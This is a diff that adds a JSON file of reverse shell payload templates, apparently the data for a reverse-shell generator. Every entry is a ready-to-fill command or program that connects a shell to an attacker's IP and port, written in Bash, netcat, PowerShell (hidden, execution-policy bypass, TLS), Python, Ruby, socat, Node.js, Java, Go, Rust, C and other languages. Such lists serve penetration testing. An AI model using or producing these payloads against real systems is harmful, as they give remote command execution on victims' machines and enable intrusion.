@@ -1,0 +1,375 @@
+[
+    {
+        "name": "Bash -i",
+        "command": "{shell} -i >& /dev/tcp/${values.ip}/${values.port} 0>&1",
+        "tags": [
+            "linux",
+            "mac"
+        ]
+    },
+    {
+        "name": "Bash 196",
+        "command": "0<&196;exec 196<>/dev/tcp/${values.ip}/${values.port}; {shell} <&196 >&196 2>&196",
+        "tags": [
+            "linux",
+            "mac"
+        ]
+    },
+    {
+        "name": "Bash read line",
+        "command": "exec 5<>/dev/tcp/${values.ip}/${values.port};cat <&5 | while read line; do $line 2>&5 >&5; done",
+        "tags": [
+            "linux",
+            "mac"
+        ]
+    },
+    {
+        "name": "Bash 5",
+        "command": "{shell} -i 5<> /dev/tcp/${values.ip}/${values.port} 0<&5 1>&5 2>&5",
+        "tags": [
+            "linux",
+            "mac"
+        ]
+    },
+    {
+        "name": "Bash udp",
+        "command": "{shell} -i >& /dev/udp/${values.ip}/${values.port} 0>&1",
+        "tags": [
+            "linux",
+            "mac"
+        ]
+    },
+    {
+        "name": "nc mkfifo",
+        "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc ${values.ip} ${values.port} >/tmp/f",
+        "tags": [
+            "linux",
+            "mac"
+        ]
+    },
+    {
+        "name": "nc -e",
+        "command": "nc ${values.ip} ${values.port} -e {shell}",
+        "tags": [
+            "linux",
+            "mac"
+        ]
+    },
+    {
+        "name": "nc.exe -e",
+        "command": "nc.exe ${values.ip} ${values.port} -e {shell}",
+        "tags": [
+            "windows"
+        ]
+    },
+    {
+        "name": "nc -c",
+        "command": "nc -c {shell} ${values.ip} ${values.port}",
+        "tags": [
+            "linux",
+            "mac"
+        ]
+    },
+    {
+        "name": "ncat -e",
+        "command": "ncat ${values.ip} ${values.port} -e {shell}",
+        "tags": [
+            "linux",
+            "mac"
+        ]
+    },
+    {
+        "name": "ncat.exe -e",
+        "command": "ncat.exe ${values.ip} ${values.port} -e {shell}",
+        "tags": [
+            "windows"
+        ]
+    },
+    {
+        "name": "ncat udp",
+        "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|ncat -u ${values.ip} ${values.port} >/tmp/f",
+        "tags": [
+            "linux",
+            "mac"
+        ]
+    },
+    {
+        "name": "rustcat",
+        "command": "rcat ${values.ip} ${values.port} -r {shell}",
+        "tags": [
+            "linux",
+            "mac"
+        ]
+    },
+    {
+        "name": "Haskell #1",
+        "command": "module Main where\n\nimport System.Process\n\nmain = callCommand \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | {shell} -i 2>&1 | nc ${values.ip} ${values.port} >/tmp/f\"",
+        "tags": [
+            "linux",
+            "mac"
+        ]
+    },
+    {
+        "name": "Perl",
+        "command": "perl -e 'use Socket;$i=\"${values.ip}\";$p=${values.port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"{shell} -i\");};'",
+        "tags": [
+            "linux",
+            "mac"
+        ]
+    },
+    {
+        "name": "Perl no sh",
+        "command": "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"${values.ip}:${values.port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
+        "tags": [
+            "linux",
+            "mac"
+        ]
+    },
+    {
+        "name": "PowerShell #1",
+        "command": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"${values.ip}\",${values.port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
+        "tags": [
+            "windows"
+        ]
+    },
+    {
+        "name": "PowerShell #2",
+        "command": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('${values.ip}',${values.port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
+        "tags": [
+            "windows"
+        ]
+    },
+    {
+        "name": "PowerShell #3",
+        "command": "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('${values.ip}', ${values.port});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()\"",
+        "tags": [
+            "windows"
+        ]
+    },
+    {
+        "name": "PowerShell #4 (TLS)",
+        "command": "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('${values.ip}', ${values.port});$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()\"",
+        "tags": [
+            "windows"
+        ]
+    },
+    {
+        "name": "Python #1",
+        "command": "export RHOST=\"${values.ip}\";export RPORT=${values.port};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"{shell}\")'",
+        "tags": [
+            "linux",
+            "mac"
+        ]
+    },
+    {
+        "name": "Python #2",
+        "command": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${values.ip}\",${values.port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"{shell}\")'",
+        "tags": [
+            "linux",
+            "mac"
+        ]
+    },
+    {
+        "name": "Python3 #1",
+        "command": "export RHOST=\"${values.ip}\";export RPORT=${values.port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"{shell}\")'",
+        "tags": [
+            "linux",
+            "mac"
+        ]
+    },
+    {
+        "name": "Python3 #2",
+        "command": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${values.ip}\",${values.port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"{shell}\")'",
+        "tags": [
+            "linux",
+            "mac"
+        ]
+    },
+    {
+        "name": "Python3 Windows",
+        "command": "import os,socket,subprocess,threading;\ndef s2p(s, p):\n    while True:\n        data = s.recv(1024)\n        if len(data) > 0:\n            p.stdin.write(data)\n            p.stdin.flush()\n\ndef p2s(s, p):\n    while True:\n        s.send(p.stdout.read(1))\n\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((\"${values.ip}\",${values.port}))\n\np=subprocess.Popen([\"{shell}\"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)\n\ns2p_thread = threading.Thread(target=s2p, args=[s, p])\ns2p_thread.daemon = True\ns2p_thread.start()\n\np2s_thread = threading.Thread(target=p2s, args=[s, p])\np2s_thread.daemon = True\np2s_thread.start()\n\ntry:\n    p.wait()\nexcept KeyboardInterrupt:\n    s.close()",
+        "tags": [
+            "windows"
+        ]
+    },
+    {
+        "name": "Python3 shortest",
+        "command": "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"${values.ip}\",${values.port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"{shell}\")'",
+        "tags": [
+            "linux"
+        ]
+    },
+    {
+        "name": "Ruby #1",
+        "command": "ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"${values.ip}\",${values.port}))'",
+        "tags": [
+            "linux",
+            "mac"
+        ]
+    },
+    {
+        "name": "Ruby no sh",
+        "command": "ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"${values.ip}\",\"${values.port}\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}'",
+        "tags": [
+            "linux",
+            "mac"
+        ]
+    },
+    {
+        "name": "socat #1",
+        "command": "socat TCP:${values.ip}:${values.port} EXEC:{shell}",
+        "tags": [
+            "linux",
+            "mac"
+        ]
+    },
+    {
+        "name": "socat #2 (TTY)",
+        "command": "socat TCP:${values.ip}:${values.port} EXEC:'{shell}',pty,stderr,setsid,sigint,sane",
+        "tags": [
+            "linux",
+            "mac"
+        ]
+    },
+    {
+        "name": "node.js",
+        "command": "require('child_process').exec('nc -e {shell} ${values.ip} ${values.port}')",
+        "tags": [
+            "linux",
+            "mac"
+        ]
+    },
+    {
+        "name": "node.js #2",
+        "command": "(function(){\r\n    var net = require(\"net\"),\r\n        cp = require(\"child_process\"),\r\n        sh = cp.spawn(\"\\{shell}\", []);\r\n    var client = new net.Socket();\r\n    client.connect(${values.port}, \"${values.ip}\", function(){\r\n        client.pipe(sh.stdin);\r\n        sh.stdout.pipe(client);\r\n        sh.stderr.pipe(client);\r\n    });\r\n    return \/a\/; \/\/ Prevents the Node.js application from crashing\r\n})();",
+        "tags": [
+            "linux",
+            "mac",
+            "windows"
+        ]
+    },
+    {
+        "name": "Java #1",
+        "command": "public class shell {\n    public static void main(String[] args) {\n        Process p;\n        try {\n            p = Runtime.getRuntime().exec(\"bash -c $@|bash 0 echo bash -i >& /dev/tcp/${values.ip}/${values.port} 0>&1\");\n            p.waitFor();\n            p.destroy();\n        } catch (Exception e) {}\n    }\n}",
+        "tags": [
+            "linux",
+            "mac"
+        ]
+    },
+    {
+        "name": "Java #2",
+        "command": "public class shell {\n    public static void main(String[] args) {\n        ProcessBuilder pb = new ProcessBuilder(\"bash\", \"-c\", \"$@| bash -i >& /dev/tcp/${values.ip}/${values.port} 0>&1\")\n            .redirectErrorStream(true);\n        try {\n            Process p = pb.start();\n            p.waitFor();\n            p.destroy();\n        } catch (Exception e) {}\n    }\n}",
+        "tags": [
+            "linux",
+            "mac"
+        ]
+    },
+    {
+        "name": "Java #3",
+        "command": "import java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class shell {\n    public static void main(String[] args) {\n        String host = \"${values.ip}\";\n        int port = ${values.port};\n        String cmd = \"{shell}\";\n        try {\n            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();\n            Socket s = new Socket(host, port);\n            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();\n            OutputStream po = p.getOutputStream(), so = s.getOutputStream();\n            while (!s.isClosed()) {\n                while (pi.available() > 0)\n                    so.write(pi.read());\n                while (pe.available() > 0)\n                    so.write(pe.read());\n                while (si.available() > 0)\n                    po.write(si.read());\n                so.flush();\n                po.flush();\n                Thread.sleep(50);\n                try {\n                    p.exitValue();\n                    break;\n                } catch (Exception e) {}\n            }\n            p.destroy();\n            s.close();\n        } catch (Exception e) {}\n    }\n}",
+        "tags": [
+            "windows",
+            "linux",
+            "mac"
+        ]
+    },
+    {
+        "name": "Javascript",
+        "command": "String command = \"var host = \\'${values.ip}\\';\" +\r\n                       \"var port = ${values.port};\" +\r\n                       \"var cmd = \\'{shell}\\';\"+\r\n                       \"var s = new java.net.Socket(host, port);\" +\r\n                       \"var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();\"+\r\n                       \"var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();\"+\r\n                       \"var po = p.getOutputStream(), so = s.getOutputStream();\"+\r\n                       \"print (\\'Connected\\');\"+\r\n                       \"while (!s.isClosed()) {\"+\r\n                       \"    while (pi.available() > 0)\"+\r\n                       \"        so.write(pi.read());\"+\r\n                       \"    while (pe.available() > 0)\"+\r\n                       \"        so.write(pe.read());\"+\r\n                       \"    while (si.available() > 0)\"+\r\n                       \"        po.write(si.read());\"+\r\n                       \"    so.flush();\"+\r\n                       \"    po.flush();\"+\r\n                       \"    java.lang.Thread.sleep(50);\"+\r\n                       \"    try {\"+\r\n                       \"        p.exitValue();\"+\r\n                       \"        break;\"+\r\n                       \"    }\"+\r\n                       \"    catch (e) {\"+\r\n                       \"    }\"+\r\n                       \"}\"+\r\n                       \"p.destroy();\"+\r\n                       \"s.close();\";\r\nString x = \"\\\"\\\".getClass().forName(\\\"javax.script.ScriptEngineManager\\\").newInstance().getEngineByName(\\\"JavaScript\\\").eval(\\\"\"+command+\"\\\")\";\r\nref.add(new StringRefAddr(\"x\", x);",
+        "tags": [
+            "linux",
+            "mac",
+            "windows"
+        ]
+    },
+    {
+        "name": "Groovy",
+        "command": "String host=\"${values.ip}\";int port=${values.port};String cmd=\"{shell}\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();",
+        "tags": [
+            "windows"
+        ]
+    },
+    {
+        "name": "telnet",
+        "command": "TF=$(mktemp -u);mkfifo $TF && telnet ${values.ip} ${values.port} 0<$TF | {shell} 1>$TF",
+        "tags": [
+            "linux",
+            "mac"
+        ]
+    },
+    {
+        "name": "zsh",
+        "command": "zsh -c 'zmodload zsh/net/tcp && ztcp ${values.ip} ${values.port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",
+        "tags": [
+            "linux",
+            "mac"
+        ]
+    },
+    {
+        "name": "Lua #1",
+        "command": "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('${values.ip}','${values.port}');os.execute('{shell} -i <&3 >&3 2>&3');\"",
+        "tags": [
+            "linux"
+        ]
+    },
+    {
+        "name": "Lua #2",
+        "command": "lua5.1 -e 'local host, port = \"${values.ip}\", ${values.port} local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'",
+        "tags": [
+            "linux",
+            "windows"
+        ]
+    },
+    {
+        "name": "Golang",
+        "command": "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"${values.ip}:${values.port}\");cmd:=exec.Command(\"{shell}\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go",
+        "tags": [
+            "linux",
+            "mac",
+            "windows"
+        ]
+    },
+    {
+        "name": "Vlang",
+        "command": "echo 'import os' > /tmp/t.v && echo 'fn main() { os.system(\"nc -e {shell} ${values.ip} ${values.port} 0>&1\") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v",
+        "tags": [
+            "linux",
+            "mac"
+        ]
+    },
+    {
+        "name": "Awk",
+        "command": "awk 'BEGIN {s = \"/inet/tcp/0/${values.ip}/${values.port}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null",
+        "tags": [
+            "linux",
+            "mac"
+        ]
+    },
+    {
+        "name": "Dart",
+        "command": "import 'dart:io';\nimport 'dart:convert';\n\nmain() {\n  Socket.connect(\"${values.ip}\", ${values.port}).then((socket) {\n    socket.listen((data) {\n      Process.start('{shell}', []).then((Process process) {\n        process.stdin.writeln(new String.fromCharCodes(data).trim());\n        process.stdout\n          .transform(utf8.decoder)\n          .listen((output) { socket.write(output); });\n      });\n    },\n    onDone: () {\n      socket.destroy();\n    });\n  });\n}",
+        "tags": [
+            "linux",
+            "mac",
+            "windows"
+        ]
+    },
+    {
+        "name": "Rust",
+        "command": "use std::net::TcpStream;\nuse std::os::unix::io::{AsRawFd, FromRawFd};\nuse std::process::{Command, Stdio};\n\nfn main() {\n let s = TcpStream::connect(\"${values.ip}:${values.port}\").unwrap();\n let fd = s.as_raw_fd();\n Command::new(\"{shell}\")\n .arg(\"-i\")\n .stdin(unsafe { Stdio::from_raw_fd(fd) })\n .stdout(unsafe { Stdio::from_raw_fd(fd) })\n .stderr(unsafe { Stdio::from_raw_fd(fd) })\n .spawn()\n .unwrap()\n .wait()\n .unwrap();\n}",
+        "tags": [
+            "linux",
+            "mac",
+            "windows"
+        ]
+    },
+    {
+        "name": "C",
+        "command": "#include <stdio.h>\n#include <unistd.h>\n#include <netinet/in.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n\n#define REMOTE_ADDR \"${values.ip}\"\n#define REMOTE_PORT ${values.port} \n\nint main(int argc, char *argv[])\n{\n struct sockaddr_in sa;\n int s;\n\n sa.sin_family = AF_INET;\n sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);\n sa.sin_port = htons(REMOTE_PORT);\n\n s = socket(AF_INET, SOCK_STREAM, 0);\n connect(s, (struct sockaddr *)&sa, sizeof(sa));\n dup2(s, 0);\n dup2(s, 1);\n dup2(s, 2);\n\n execve(\"{shell}\", 0, 0);\n return 0;\n}",
+        "tags": [
+            "linux",
+            "mac",
+            "windows"
+        ]
+    }
+]
